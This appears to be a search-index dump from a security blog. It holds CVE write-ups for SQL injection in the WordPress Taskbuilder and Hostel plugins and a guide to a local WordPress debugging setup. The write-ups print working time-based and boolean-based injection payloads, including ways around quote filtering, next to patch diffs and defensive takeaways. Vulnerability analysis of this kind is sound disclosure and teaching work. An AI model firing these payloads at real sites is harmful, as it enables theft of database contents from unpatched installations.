Injection.\nGet First Letter of Database Name To dump all data, the first step is to extract at least one character of the database name. Once retrieved, the rest can be dumped.\nSend a boolean-based SQLi payload with the correct proj_id:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,4,999)) Database name is wordpress, so the first character is w (HEX 0x77).\nSUBSTRING(STRING,1,1) retrieves the first character.\nHere, $proj_id = 4. Since SUBSTRING('wordpress',1,1)=0x77 is true, the IF(condition, value_if_true, value_if_false) returns 4, which exists in the database, so the response contains the project users.\nUsing HEX technique bypasses the esc_sql() function (see Patch Diff) when quotes cannot be used.\nSend a boolean-based SQLi payload with a wrong proj_id:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,999,4)) With a non-existent proj_id, the response contains None.\n👉 We successfully retrieved the first character of the database name using boolean-based SQLi:\nCorrect proj_id: response without None Wrong proj_id: response contains None Time-based SQLi could also be used, but dumping large data sets would be slow.\nConclusion The CVE-2025-39569 vulnerability in WordPress Taskbuilder arises from the missing single quotes '...' around user input in SQL queries, allowing user data to be interpreted as valid SQL syntax.\nThe patch in v4.0.2 fixed this by wrapping $proj_id in quotes, ensuring it is always treated as a literal string in SQL.\nKey Takeaways:\nPrefer prepared statements ($wpdb-\u0026gt;prepare() in WordPress) over manually inserting variables into queries. For WordPress plugins, thoroughly test Ajax endpoints, as they are the most common sources of SQLi and XSS. Administrators should regularly update plugins/themes to receive security patches promptly. References SQL Injection Cheat Sheet - PortSwigger\nWordPress Taskbuilder \u0026lt;= 4.0.1 Vulnerable to SQL Injection\n","permalink":"//localhost:1313/posts/2025-09-22-cve-2025-39569/","summary":"\u003cp\u003eThe vulnerability occurs in the \u003cstrong\u003eTaskbuilder\u003c/strong\u003e WordPress plugin before version \u003cstrong\u003e4.0.2\u003c/strong\u003e. This could allow an attacker to directly interact with your database, including, but not limited to, stealing information.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39569\"\u003eCVE-2025-39569\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/taskbuilder/\"\u003eWordPress Taskbuilder Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt; 4.0.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS Severity\u003c/strong\u003e: High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e: v4.0.1 (vulnerable) and v4.0.2 (patched)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDiff Tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e or any tool that can compare files to see differences between two versions\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eThe application \u003cstrong\u003esanitizes input data\u003c/strong\u003e before using it in SQL queries. However, during query construction, this value is inserted directly without being wrapped in single quotes \u003ccode\u003e'...'\u003c/code\u003e. This allows an attacker to inject valid SQL syntax (such as \u003ccode\u003eOR\u003c/code\u003e, \u003ccode\u003eAND\u003c/code\u003e, etc.) into the query, resulting in a SQL Injection vulnerability.\u003c/p\u003e","title":"CVE-2025-39569 Analysis \u0026 POC"},{"content":"A vulnerability in the Hostel plugin prior to version 1.1.5.7. Because input is not sanitized properly, this may allow an attacker to interact directly with the database, including but not limited to data exfiltration.\nCVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6 (vulnerable) and v1.1.5.7 (fixed) diff tool: meld or any tool capable of comparing two versions to show differences Analysis The root cause is that the application injects data from a GET request directly into an SQL query while the validation/whitelisting is insufficient.\nPatch Diff Use any diff tool to compare the vulnerable version and the patched version. A clear difference exists in the file controllers/bookings.php\nVulnerable version:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } Patched version:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } 👉 The patch uses a whitelist to restrict which columns can be used for ordering; if the supplied value is not valid it falls back to 'tB.id'.\nAnalysis: The vulnerability appears because the ob parameter is passed directly into the ORDER BY clause after sanitize_text_field(). That function only escapes/cleans text for HTML contexts and does not validate or filter for SQL injection in an SQL context.\nHow it works To inject, we need to identify the complete query used here:\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); The query resides in the default branch of the switch structure.\nAll this logic belongs to the static manage() method of the WPHostelBookings class.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } In WordPress, plugins communicate with core via the Plugin API (Hook System). Therefore, to find where manage() is invoked, we can search for the string \u0026quot;manage\u0026quot; in the plugin folder.\nIn the file models/hostel.php we have:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } Here:\nadd_menu_page() creates the main menu in the Admin Dashboard. add_submenu_page() adds submenu items under that menu. The $callback parameter is the callback function invoked when a user clicks the menu/submenu. Example:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() All these menu/submenu items are registered inside the static menu() method of the WPHostel class. To locate where menu() is called, search for the menu hook in the plugin directory.\nIn the plugin root file hostel.php we have:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() add_action() is the WordPress Plugin API that attaches a callback to an action hook. The hook name here is admin_menu, meaning WPHostel::menu() will be called during the lifecycle when WordPress builds the Admin Dashboard Menu. Menu in the Admin UI\nDebugging\nThe faulty functionality is in the Booking Manager, so navigate to the Manage Bookings submenu in the Admin UI.\nRight before the default branch there is a comment // list bookings — indicating this code handles listing and ordering bookings.\nOpen your debugger:\nClick Run with Debugger. Set a breakpoint at the switch branch that contains the vulnerable code and at the exact line that assigns the vulnerable value. When you click a column header in the bookings table, observe:\nThe debugger steps into the switch. Use Step Over to reach the default branch. Continue Step Over and inspect variables in Variables \u0026gt; Locals. These variables combine to form the SQL query below. After combining the variables, the full query looks like:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... Notably, the $orderby variable is assigned as:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } ⚠️ Issues here:\nThe part after ORDER BY uses sanitize_text_field(). That function only cleans HTML, and does not validate or filter input to make it safe in an SQL context. Therefore the ob parameter (provided by the user) can be abused to inject SQL directly. Exploit Detecting SQLi Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 We separate the ORDER BY clause with a comma because it accepts multi-column values.\nResult: the response time is delayed → SQL Injection succeeded.\nDumping Data from the Database Bypass ' using ORD():\nTo dump database data we need to extract characters such as the first character of the database name.\nBecause sanitize_text_field() removes single quotes ('), we cannot use payloads relying on '. Instead, use ORD() to compare character ASCII codes:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Bypass succeeds → we can extract the database name.\nBypass ' using Hex encoding (alternative)\nBesides ORD() we can use Hex encoding to bypass:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Bypass succeeds → database name can be extracted.\nConclusion The vulnerability CVE-2025-39566 in the WordPress Hostel plugin (versions prior to 1.1.5.7) stems from inserting user-supplied input directly into an SQL query without adequate safeguards, leading to SQL Injection.\nKey takeaways:\nsanitize_text_field() ≠ protection against SQL Injection Distinguish clearly between input cleaning for HTML contexts and validation/sanitization for SQL contexts References SQL Injection Cheat Sheet – PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/posts/2025-09-21-cve-2025-39566/","summary":"\u003cp\u003eA vulnerability in the \u003cstrong\u003eHostel\u003c/strong\u003e plugin prior to version \u003cstrong\u003e1.1.5.7\u003c/strong\u003e. Because input is not sanitized properly, this may allow an attacker to interact directly with the database, including but not limited to data exfiltration.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/blog/posts/2025-09-20-wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e: v1.1.5.6 (vulnerable) and v1.1.5.7 (fixed)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e or any tool capable of comparing two versions to show differences\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eThe root cause is that the application injects data from a \u003cstrong\u003eGET\u003c/strong\u003e request directly into an SQL query while the validation/whitelisting is insufficient.\u003c/p\u003e","title":"CVE-2025-39566 Analysis \u0026 POC"},{"content":"WordPress is a powerful and the most popular content management system (CMS) that allows you to create, manage, and customize websites and blogs easily. It’s an open-source CMS, built on PHP, and uses either MySQL or MariaDB databases.\nReleased in 2003, initially as a blogging platform, later evolved into a full-featured system for websites, online stores, forums, landing pages, etc. Today, more than 40% of websites worldwide run on WordPress. There are two versions of WordPress:\nWordPress.com\nHosting service provided by Automattic You only need to register an account, no installation required Limited customization, advanced features require payment WordPress.org\nOpen-source, you download and install it on your own hosting/server Full customization, install plugins, themes, write code, build any website you want Ecosystem Core: The main CMS Plugins: Add-on software installed on a WordPress site to extend functionality and add new features Themes: Add-on software that defines the visual appearance and layout of a WordPress site Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Currently, over 40% of all websites worldwide run WordPress This means hackers only need to find one common vulnerability =\u0026gt; they can exploit millions of sites at once Like the saying: “fish where the fish are” Plugin and Theme WordPress Core has been reviewed for a long time by thousands of developers and researchers, making it difficult for attackers to break in However, tens of thousands of plugins and themes from various sources are in use, with inconsistent quality Many plugins have poor security code or are no longer updated. Hackers only need to scan plugins/themes for outdated versions and exploit them Setup WordPress for Hacking There are many ways to set up WordPress; searching on Google will show plenty of guides. Here, I’ll set it up on an Ubuntu (22.04) virtual machine:\nNo effect on the host machine’s services WordPress is lightweight enough to run in a VM Install and Configure WordPress Install Dependencies Install the full stack needed to run WordPress (web server + database + PHP + required extensions).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress Download and install WordPress source code into the web directory.\n# Create a folder to store the website source code sudo mkdir -p /srv/www # Change owner to www-data, the default user for Apache/Nginx web server sudo chown www-data: /srv/www # Download the latest WordPress package from the official site # Extract it into /srv/www curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www To download a specific version:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www Installing from wordpress.org is the most reliable method:\nUbuntu provides a wordpress package in its repo, but it’s usually outdated compared to the official release. The WordPress community only supports the official release. If you encounter issues with the Ubuntu package, they won’t help. Configure Apache for WordPress Create /etc/apache2/sites-available/wordpress.conf:\n\u0026lt;VirtualHost *:80\u0026gt; DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks AllowOverride Limit Options FileInfo DirectoryIndex index.php Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; Enable WordPress site:\nsudo a2ensite wordpress Enable mod_rewrite:\nsudo a2enmod rewrite Disable default site (optional):\nsudo a2dissite 000-default Or add ServerName mywordpress.local in VirtualHost and update your system’s hosts file.\nReload Apache:\nsudo service apache2 reload Configure Database Open MySQL:\nsudo mysql -u root Create DB and user:\nCREATE DATABASE wordpress; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; FLUSH PRIVILEGES; quit Restart MySQL:\nsudo service mysql start Configure WordPress DB Connection Copy and edit config:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php Update DB info:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php Add secret keys/salts from: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Visit http://localhost and set site title, username, password, email for the admin user.\nSetup Debug on VSCode To understand request flow, we need debugging.\nAdd PHP Debug Extension In VS Code Extensions (Ctrl+Shift+X) =\u0026gt; search PHP Debug (by Felix Becker) =\u0026gt; Install.\nInstall Xdebug sudo apt install php-xdebug -y php -v If you see with Xdebug v3.x.x, installation is OK.\nConfigure Xdebug Edit php.ini:\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json Open project in VS Code:\ncode /srv/www/wordpress Add launch.json:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } Now WordPress is fully set up locally with VS Code debugging.\nExtend Required Version Each WordPress version requires a compatible PHP version. Check this to avoid setup errors.\nWordPress Auto Update Since WordPress 3.7 (2013), background automatic updates exist for:\nSecurity releases Maintenance releases Not for major versions (unless explicitly enabled) WordPress checks api.wordpress.org for updates and applies them automatically.\nTo disable auto-updates, add in wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); Increase Uploadable Plugin Size By default, WordPress relies on PHP configuration (upload_max_filesize, post_max_size, and sometimes max_execution_time) to determine the maximum file size that can be uploaded. On many servers, this limit is set as low as 2MB – 8MB, which is not enough for modern plugins.\nWhy Increase the Limit? Large plugins: Some plugins such as WooCommerce extensions, page builders, backup tools, or security suites can easily reach 20MB – 100MB.\nAvoid errors: If the plugin .zip file exceeds the limit, you’ll see errors like:\n“The uploaded file exceeds the upload_max_filesize directive in php.ini” Or the upload process fails silently. Ease of use: Increasing the limit allows administrators to upload plugins directly from the WordPress Dashboard without needing FTP/SSH access.\nDevelopment and testing: Developers testing their own plugins (with bundled assets like JS, CSS, images, or libraries) may generate larger .zip files. A higher limit makes local testing smoother.\nHow to Increase Plugin Upload Size There are several methods depending on your hosting environment:\nEdit php.ini (if you control the server)\nupload_max_filesize = 64M post_max_size = 64M max_execution_time = 300 Edit .htaccess (for Apache servers)\nphp_value upload_max_filesize 64M php_value post_max_size 64M php_value max_execution_time 300 php_value max_input_time 300 Update wp-config.php Add before the line /* That's all, stop editing! Happy publishing. */:\n@ini_set( \u0026#39;upload_max_filesize\u0026#39; , \u0026#39;64M\u0026#39; ); @ini_set( \u0026#39;post_max_size\u0026#39;, \u0026#39;64M\u0026#39;); @ini_set( \u0026#39;max_execution_time\u0026#39;, \u0026#39;300\u0026#39; ); 👉 It’s recommended to set a reasonable value (e.g., 64MB or 128MB). Avoid setting it too high (hundreds of MBs), as it may open the door to abuse (e.g., users uploading excessively large files that overload the server).\n","permalink":"//localhost:1313/posts/2025-09-20-wordpress-local-and-debugging/","summary":"\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e is a powerful and the most popular content management system (CMS) that allows you to create, manage, and customize websites and blogs easily. It’s an open-source CMS, built on PHP, and uses either MySQL or MariaDB databases.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eReleased in 2003, initially as a blogging platform, later evolved into a full-featured system for websites, online stores, forums, landing pages, etc.\u003c/li\u003e\n\u003cli\u003eToday, more than 40% of websites worldwide run on WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eThere are two versions of WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"The vulnerability occurs in the Taskbuilder WordPress plugin before version 4.0.2. This could allow an attacker to directly interact with your database, including, but not limited to, stealing information.\nCVE ID: CVE-2025-39569 Product: WordPress Taskbuilder Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt; 4.0.2 CVSS Severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Taskbuilder Plugin: v4.0.1 (vulnerable) and v4.0.2 (patched) Diff Tool: meld or any tool that can compare files to see differences between two versions Analysis The application sanitizes input data before using it in SQL queries. However, during query construction, this value is inserted directly without being wrapped in single quotes '...'. This allows an attacker to inject valid SQL syntax (such as OR, AND, etc.) into the query, resulting in a SQL Injection vulnerability.\nPatch Diff Use any diff tool to compare differences between the vulnerable version and the patched version.\nThe clear difference is in the file includes/admin/projects/get_users.php.\nIn version v4.0.1, the variable $proj_id is escaped but inserted directly into the query without quotes:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = $proj_id\u0026#34; ); In version v4.0.2, the query is adjusted to wrap $proj_id in quotes after escaping:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = \u0026#39;$proj_id\u0026#39;\u0026#34; ); This patch ensures that the $proj_id value after escaping is treated as a literal string, preventing it from escaping the quotes to inject SQL syntax, effectively mitigating the SQL Injection.\nHow It Works File Architecture:\nGeneral structure of the current file:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project WHERE id = $proj_id\u0026#34;); // Start buffer to generate the main modal content ob_start(); // ... render HTML user list $body = ob_get_clean(); // Start buffer to generate modal footer ob_start(); // ... render HTML buttons (Close, Save) $footer = ob_get_clean(); // Return JSON data for frontend modal rendering echo json_encode([ \u0026#39;body\u0026#39; =\u0026gt; $body, \u0026#39;footer\u0026#39; =\u0026gt; $footer, ]); $proj_id / $project: Fetch project data from the database. ob_start() / ob_get_clean(): Buffer HTML output instead of printing directly, storing it in a variable. $body / $footer: Contain dynamic HTML for the modal. json_encode(): Returns JSON to the client, often used in Ajax to render modals without refreshing the page. The file is located in includes, suggesting it’s called from another feature. To find where it’s used, search for get_users.php in the plugin directory.\n👉 It is included in the function wppm_get_users() of the class WPPM_Admin in class-wppm-admin.php. wppm_get_users() is a callback for a WordPress action hook.\nWPPM_Admin constructor:\nfinal class WPPM_Admin { public function __construct() { // other actions add_action( \u0026#39;wp_ajax_wppm_get_users\u0026#39;, array($this,\u0026#39;wppm_get_users\u0026#39;)); // other actions } } add_action() is a WordPress Plugin API method to attach a callback to an action hook.\nwp_ajax_wppm_get_users is an Ajax hook name:\nwp_ajax_{action} → handles Ajax for logged-in users. wp_ajax_nopriv_{action} → handles Ajax for non-logged-in users. Here, action = wppm_get_users. If you send action=wppm_get_users via Ajax to admin-ajax.php, WordPress will execute the corresponding callback, here wppm_get_users().\n👉 Knowing action = wppm_get_users, you can find which Ajax requests use it by searching wppm_get_users in .js files of the plugin.\nThe wppm_get_users action is the data part in the POST request handled by wppm_get_users().\nThe function is referenced in HTML attributes of the project feature:\nCreate a new project Access that project Inspect code to locate wppm_get_users and see which actions call it 👉 Clicking the icon next to Users triggers Ajax, sending a request to the server to fetch project users and render them in HTML.\nExploit Detect SQLi Capture requests using BurpSuite and send a time-based SQLi payload:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+SLEEP(1)) Response delay indicates a successful SQL Injection.\nGet First Letter of Database Name To dump all data, the first step is to extract at least one character of the database name. Once retrieved, the rest can be dumped.\nSend a boolean-based SQLi payload with the correct proj_id:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,4,999)) Database name is wordpress, so the first character is w (HEX 0x77).\nSUBSTRING(STRING,1,1) retrieves the first character.\nHere, $proj_id = 4. Since SUBSTRING('wordpress',1,1)=0x77 is true, the IF(condition, value_if_true, value_if_false) returns 4, which exists in the database, so the response contains the project users.\nUsing HEX technique bypasses the esc_sql() function (see Patch Diff) when quotes cannot be used.\nSend a boolean-based SQLi payload with a wrong proj_id:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,999,4)) With a non-existent proj_id, the response contains None.\n👉 We successfully retrieved the first character of the database name using boolean-based SQLi:\nCorrect proj_id: response without None Wrong proj_id: response contains None Time-based SQLi could also be used, but dumping large data sets would be slow.\nConclusion The CVE-2025-39569 vulnerability in WordPress Taskbuilder arises from the missing single quotes '...' around user input in SQL queries, allowing user data 